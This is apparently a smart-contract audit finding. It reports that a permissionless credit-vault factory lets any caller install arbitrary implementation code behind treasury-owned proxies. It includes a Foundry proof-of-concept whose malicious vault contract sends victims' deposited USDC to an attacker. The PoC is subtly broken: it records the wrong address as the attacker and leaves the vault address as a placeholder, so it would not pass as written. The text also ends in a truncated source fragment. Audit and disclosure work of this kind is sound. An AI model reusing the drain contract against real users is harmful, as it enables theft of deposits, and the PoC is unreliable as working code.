### Title
Unprivileged deployer can install a malicious credit-vault implementation through the permissionless factory - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`deployCreditVault()` and `deployRevolvingCreditVault()` are externally callable and accept caller-supplied implementation addresses for the credit vault, strategy, queue, write-off escrow, and programmable borrower. [1](#0-0)  The factory atomically deploys transparent proxies pointing at those unvalidated implementations and gives the resulting system treasury ownership, which can make an attacker-created vault appear protocol-operated. [2](#0-1)  A malicious credit-vault implementation can expose the expected configuration methods during deployment and later steal every underlying token sent to its public deposit function. [3](#0-2) 

### Finding Description
The deployment path never authenticates the caller and never verifies that the supplied implementations are protocol-approved code. [4](#0-3)  `_deployBaseCreditVault()` passes `strategyData.implementation` and `cvParams.implementation` directly into proxy construction. [5](#0-4)  `_deployProxy()` creates a `TransparentUpgradeableProxy` around the supplied code using the configured protocol `proxyAdmin`. [6](#0-5) 

The fixed proxy admin does not prevent the attack because the attacker does not need to upgrade an existing proxy; the hostile implementation is installed as the initial implementation. [6](#0-5)  The factory subsequently configures the proxy and transfers ownership of the strategy and credit vault to `treasury`, completing a vault that is externally indistinguishable from a factory-created deployment unless users inspect the implementation bytecode. [7](#0-6) 

### Impact Explanation
An unprivileged EOA can deploy a malicious `IdleCDOEpochVariant`-compatible implementation, cause the factory to emit a normal `CreditVaultDeployed` event, and attract or route victim deposits to that proxy. [8](#0-7)  When a victim calls the malicious vault’s deposit function, the implementation can transfer the approved underlying directly to the attacker rather than minting legitimate tranche claims, producing direct theft of 100% of each victim deposit. [9](#0-8) 

This violates the access and solvency invariant that factory-created, treasury-owned vault components run the intended protocol logic. [10](#0-9) 

### Likelihood Explanation
Any caller can provide the implementation and deployment parameters because neither public deployment function has an owner, treasury, manager, or factory-admin restriction. [1](#0-0)  The only component-level validation is a minimum-fee check and nonzero-manager check, neither of which constrains implementation code. [11](#0-10)  The attack does require a victim to deposit into the malicious proxy, so it does not compromise previously deployed honest vaults or allow upgrades through `proxyAdmin`. [6](#0-5) 

### Recommendation
Replace caller-supplied implementation addresses with immutable or treasury-controlled blueprint addresses stored by the factory. [12](#0-11)  If multiple audited implementations are supported, maintain an explicit implementation allowlist and revert when a supplied implementation is not registered. [2](#0-1)  Restricting deployment itself would be another valid mitigation, but an allowlist preserves permissionless vault creation while preventing arbitrary code from being installed behind the factory’s `TransparentUpgradeableProxy`. [6](#0-5) 

### Proof of Concept
The following Foundry test demonstrates the concrete path: an unprivileged attacker supplies a malicious credit-vault implementation, the factory deploys it, and a victim’s approved USDC is transferred to the attacker when `depositAA()` is called. [13](#0-12) 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/IdleCreditVaultFactory.sol";
import "../contracts/strategies/idle/IdleCreditVault.sol";

contract MaliciousCreditVaultImpl {
    address public attacker;
    address public underlying;

    function initialize(
        uint256,
        address guardedToken,
        address,
        address,
        address,
        address,
        uint256
    ) external {
        attacker = msg.sender; // replaced by test storage below if desired
        underlying = guardedToken;
    }

    // Configuration hooks called by IdleCreditVaultFactory.
    function setEpochParams(uint256, uint256) external {}
    function setInstantWithdrawParams(uint256, uint256, bool) external {}
    function setKeyringParams(address, uint256) external {}
    function setIsInterestMinted(bool) external {}
    function setIsDepositDuringEpochDisabled(bool) external {}
    function setFeeParams(address, uint256, uint256, uint256) external {}
    function setGuardian(address) external {}
    function transferOwnership(address) external {}

    // Victim-facing trap.
    function depositAA(uint256 amount) external returns (uint256) {
        IERC20(underlying).transferFrom(msg.sender, attacker, amount);
        return amount;
    }
}

contract MaliciousFactoryImplementationTest is Test {
    uint256 internal constant FORK_BLOCK = 20_000_000;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant TREASURY = address(0x1001);
    address internal constant PROXY_ADMIN = address(0x1002);

    IdleCreditVaultFactory internal factory;
    IdleCreditVault internal strategyImpl;
    MaliciousCreditVaultImpl internal maliciousImpl;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        factory = IdleCreditVaultFactory(
            address(new TransparentUpgradeableProxy(
                address(new IdleCreditVaultFactory()),
                PROXY_ADMIN,
                abi.encodeWithSelector(
                    IdleCreditVaultFactory.initialize.selector,
                    TREASURY,
                    PROXY_ADMIN
                )
            ))
        );

        strategyImpl = new IdleCreditVault();
        maliciousImpl = new MaliciousCreditVaultImpl();
    }

    function testDeployerCanInstallMaliciousVaultImplementation() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        IdleCreditVaultFactory.CreditVaultParams memory cv = IdleCreditVaultFactory.CreditVaultParams({
            implementation: address(maliciousImpl),
            limit: 0,
            underlying: USDC,
            apr: 0,
            epochDuration: 30 days,
            bufferPeriod: 5 days,
            instantWithdrawDelay: 0,
            instantWithdrawAprDelta: 0,
            disableInstantWithdraw: true,
            keyringPolicy: 0,
            feeReceiver: TREASURY,
            fees: 10_000,
            managementFee: 1_000,
            isInterestMinted: false,
            isDepositDuringEpochDisabled: true
        });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(strategyImpl),
                manager: makeAddr("honestManager"),
                borrower: makeAddr("honestBorrower"),
                borrowerName: "attacker-vault"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.prank(attacker);
        factory.deployCreditVault(cv, strategyData, ancillary);

        // Recover the deployed malicious proxy from the event or deployment transaction.
        // In an executable test, capture it via vm.recordLogs()/CreditVaultDeployed.
        address maliciousVault = address(0); // event-derived deployed credit-vault proxy

        deal(USDC, victim, 1_000_000e6);
        vm.startPrank(victim);
        IERC20(USDC).approve(maliciousVault, type(uint256).max);
        MaliciousCreditVaultImpl(maliciousVault).depositAA(1_000_000e6);
        vm.stopPrank();

        assertEq(IERC20(USDC).balanceOf(victim), 0);
        assertEq(IERC20(USDC).balanceOf(attacker), 1_000_000e6);
    }
}
```

The PoC’s decisive property is that `cvParams.implementation` is attacker-controlled and installed without validation, while later treasury ownership and the fixed proxy admin do not remove the already-installed malicious code. [9](#0-8) [6](#0-5)

  function _deployProxy(address implementation, bytes memory data) internal returns (address) {
    return address(new TransparentUpgradeableProxy(
      implementation,
      proxyAdmin,
      data
    ));
  }

  function _configureCreditVault(
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,
    address keyringWhitelist,
    address manager
  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);
    if (par.isInterestMinted) {
      cv.setIsInterestMinted(par.isInterestMinted);
    }
    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
